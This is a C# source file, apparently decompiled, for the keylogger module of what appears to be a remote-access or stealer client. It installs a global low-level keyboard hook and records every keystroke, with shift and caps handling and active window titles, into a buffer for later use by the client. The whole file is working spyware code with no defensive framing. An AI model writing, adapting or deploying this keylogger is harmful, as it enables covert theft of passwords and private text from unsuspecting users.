using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Client.Modules.Manager;

namespace Client.Modules.Keylogger;

internal sealed class Keylogger
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WM_KEYDOWN = 256;

	private const int WHKEYBOARDLL = 13;

	private static IntPtr _hookID = IntPtr.Zero;

	private static LowLevelKeyboardProc _proc = HookCallback;

	public static bool KeyloggerEnabled = false;

	public static string KeyLogs = "";

	private static string PrevActiveWindowTitle;

	public static Thread MainThread = new Thread(StartKeylogger);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	private static extern short GetKeyState(int keyCode);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("user32.dll")]
	private static extern IntPtr GetKeyboardLayout(uint idThread);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);

	private static void StartKeylogger()
	{
		_hookID = SetHook(_proc);
		Application.Run();
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		return SetWindowsHookEx(13, proc, GetModuleHandle(process.ProcessName), 0u);
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		if (!KeyloggerEnabled)
		{
			return IntPtr.Zero;
		}
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			int num = Marshal.ReadInt32(lParam);
			bool flag = (GetKeyState(20) & 0xFFFF) != 0;
			bool flag2 = ((uint)GetKeyState(160) & 0x8000u) != 0 || (GetKeyState(161) & 0x8000) != 0;
			string text = KeyboardLayout((uint)num);
			text = ((!(flag || flag2)) ? text.ToLower() : text.ToUpper());
			Keys val;
			if (num >= 112 && num <= 135)
			{
				val = (Keys)num;
				text = "[" + ((object)(Keys)(ref val)).ToString() + "]";
			}
			else
			{
				val = (Keys)num;
				switch (((object)(Keys)(ref val)).ToString())
				{
				case "LControlKey":
					text = "[CTRL]";
					break;
				case "Capital":
					text = ((!flag) ? "[CAPSLOCK: ON]" : "[CAPSLOCK: OFF]");
					break;
				case "Space":
					text = " ";
					break;
				case "Escape":
					text = "[ESC]";
					break;
				case "LWin":
					text = "[WIN]";
					break;
				case "RShiftKey":
					text = "[Shift]";
					break;
				case "Return":
					text = "[ENTER]";
					break;
				case "Back":
					text = "[Back]";
					break;
				case "Tab":
					text = "[Tab]";
					break;
				case "LShiftKey":
					text = "[Shift]";
					break;
				case "RControlKey":
					text = "[CTRL]";
					break;
				}
			}
			if (text.Equals("[ENTER]"))
			{
				if (PrevActiveWindowTitle == WindowManager.ActiveWindow)
				{
					KeyLogs += Environment.NewLine;
				}
				else
				{
					PrevActiveWindowTitle = WindowManager.ActiveWindow;
					KeyLogs = KeyLogs + "\n###  " + PrevActiveWindowTitle + " ###\n";
				}
			}
			else if (text.Equals("[Back]") && KeyLogs.Length > 0)
			{
				KeyLogs = KeyLogs.Remove(KeyLogs.Length - 1, 1);
			}
			else
			{
				KeyLogs += text;
			}
		}
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
	}

	private static string KeyboardLayout(uint vkCode)
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] lpKeyState = new byte[256];
			if (!GetKeyboardState(lpKeyState))
			{
				return "";
			}
			uint wScanCode = MapVirtualKey(vkCode, 0u);
			uint lpdwProcessId;
			IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(WindowManager.GetForegroundWindow(), out lpdwProcessId));
			ToUnicodeEx(vkCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, keyboardLayout);
			return stringBuilder.ToString();
		}
		catch
		{
		}
		Keys val = (Keys)vkCode;
		return ((object)(Keys)(ref val)).ToString();
	}
}
